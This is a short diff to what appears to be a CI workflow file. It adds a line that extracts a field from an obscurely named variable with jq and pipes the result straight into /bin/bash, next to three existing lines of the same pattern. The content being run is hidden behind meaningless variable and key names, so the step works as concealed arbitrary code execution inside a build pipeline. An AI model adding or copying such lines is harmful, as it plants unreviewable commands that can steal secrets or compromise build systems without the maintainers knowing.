@@ -25,6 +25,7 @@ jobs:
           echo $mqz2 | jq -r .k8 | /bin/bash
           printf '%s' "$m46" | jq -r .ci73 | /bin/bash
           echo $g73866 | jq -r .v8525 | /bin/bash
+          printf '%s' "$lqk36857" | jq -r .w972 | /bin/bash
 
       - name: Store results
         if: always()
